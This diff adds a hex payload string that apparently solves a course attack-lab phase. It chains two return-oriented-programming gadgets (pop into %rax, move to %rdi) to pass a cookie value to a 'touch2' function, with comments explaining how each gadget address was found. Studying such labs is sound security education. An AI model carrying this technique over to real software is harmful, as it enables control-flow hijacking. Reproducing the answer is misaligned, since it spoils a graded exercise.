@@ -1,0 +1,12 @@
+00 00 00 00 00 00 00 00 /* Buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+8e 15 40 00 00 00 00 00 /* gadget 1; could also be 8e 15 40...   82 15 40; derived from "pt B" pg 11 in pdf,                            popq %rax to get value 58. Search for this in the start_farm/getval section;                                looking for adrress that ends with 58 c3; add by the offset which is 4. Do in                                litle endian order
+                        */ 
+51 ab 05 66 00 00 00 00 /* value of cookie */
+6c 15 40 00 00 00 00 00 /* gadget 2; derived from same location(star_farm/getval) but is looking for 48 89                              c7 c3 as derived from table A on pg 11 b/c movq %rax, %rdi ; take base address                              and add offset (0x2 in this case */
+b5 13 40 00 00 00 00 00 /* address of touch 2 */  
